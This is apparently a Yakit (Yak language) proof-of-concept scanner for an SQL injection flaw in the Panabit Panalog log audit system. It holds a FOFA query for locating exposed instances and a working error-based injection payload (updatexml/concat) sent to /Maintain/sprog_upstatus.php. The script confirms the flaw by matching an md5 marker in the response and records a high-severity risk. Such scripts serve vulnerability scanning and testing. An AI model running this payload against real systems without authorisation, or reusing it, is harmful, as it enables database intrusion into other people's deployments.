#fofa app="Panabit-Panalog"
yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `GET /Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,md5()),0)&rdb=1 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Host: {{params(target)}}

`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(8),
    )

    //dump(rsp)
    if str.MatchAllOfSubString(rsp, '7f336460fdcb76a5972ceed2f4ddf953'){
        yakit.Info("%v found panabit日志审计系统sprog_upstatus SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("panabit日志审计系统sprog_upstatus SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("panabit日志审计系统sprog_upstatus SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
